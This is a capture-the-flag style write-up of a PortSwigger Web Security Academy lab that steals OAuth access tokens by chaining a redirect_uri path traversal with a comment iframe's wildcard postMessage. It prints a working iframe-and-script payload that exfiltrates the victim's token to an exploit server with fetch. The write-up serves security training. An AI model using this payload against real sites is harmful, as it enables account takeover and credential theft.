## Labs Covered

This write-up focuses on the following **EXPERT-level lab** from the PortSwigger Web Security Academy related to **OAuth Authentication**:

**Stealing OAuth access tokens via a proxy page**  
This lab demonstrates how attackers can leverage proxy pages to intercept and steal OAuth access tokens during authorization flows.

---

### LAB 6 - Stealing OAuth access tokens via a proxy page

### Lab Description

<img width="862" height="664" alt="image" src="https://github.com/user-attachments/assets/e9ccf2eb-c7e4-4d8c-a93c-6374c1c4dd35" />

**Solution**

This was a very tricky lab. To solve this, I had to find a secondary vulnerability in the website and use that as a proxy to steal the admin’s access token. It took me a while to understand what was supposed to be done here.
I started by logging into the website and going through the requests in Burp. I tried the directory traversal with **redirect_uri** and it was working. So, this was my primary vulnerability and I had to combine it with a secondary vulnerability.

<img width="1920" height="805" alt="image" src="https://github.com/user-attachments/assets/98966bc4-5f79-4ab1-976a-431102ce900c" />



I checked other pages on the website. There was no Next post option, unlike the previous lab. But I noticed that the Leave a comment section which was inside an iframe was using **window.postMessage()** method to send **window.location.href** data to the parent with target as **wildcard(*)**. This means that the child window (iframe) can send data to any parent window (domain). I decided to take advantage of this property. What if I could traverse the redirect_uri to the comment form?

THe use of * as the target in **window.postMessage()** indicates that the message is intended to be sent to any window, not just a specific one. 


<img width="1878" height="437" alt="image" src="https://github.com/user-attachments/assets/ebf17251-e4a2-46fb-ad00-2cea919c289f" />

<img width="755" height="488" alt="image" src="https://github.com/user-attachments/assets/a114750f-7f95-4487-b3a9-7542a0444ad7" />


<img width="1235" height="425" alt="image" src="https://github.com/user-attachments/assets/d3394773-ed94-4544-a089-74de82f258b9" />




I created an **iframe** that would point the redirect_uri to the comment form and added a script that would send the data received in the iframe to the parent window i.e. exploit server.

```

<iframe src=”https://oauth-0ace00b903459d15c097e8df02c000ab.web-security-academy.net/auth?client_id=y7wlhfhlcxdrmwehtm2d8&redirect_uri=https://0a69004f030e9d9cc082e851005100e5.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-621271860&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message',function(e){
fetch("/" + encodeURIComponent(e.data.data))})
</script>

```
<img width="1069" height="875" alt="image" src="https://github.com/user-attachments/assets/0928a7bc-0a3e-4428-b2c9-803dd86cb694" />


VIEW EXPLOIT

<img width="824" height="376" alt="image" src="https://github.com/user-attachments/assets/194e57b3-fb4f-4c3b-a01e-ef3ce0383dae" />


I delivered the exploit to victim and observed the server logs. There was a `GET` request to comment form with an access token appended to it since the redirected URL was disclosing it. This was the admin’s access token.

<img width="1902" height="183" alt="image" src="https://github.com/user-attachments/assets/d9e70ea4-47ef-4617-8887-9c3c349019d8" />


I issued a request to `/me` endpoint using that access token in Authorization: Bearer and found admin’s **apikey**.


<img width="1920" height="674" alt="image" src="https://github.com/user-attachments/assets/c7f315a6-bb7f-4391-9789-f5920d760355" />



I submitted the **apikey** and solved the lab!

<img width="1549" height="315" alt="image" src="https://github.com/user-attachments/assets/cc241b37-8e04-49ee-b676-25deb39f67ed" />

---
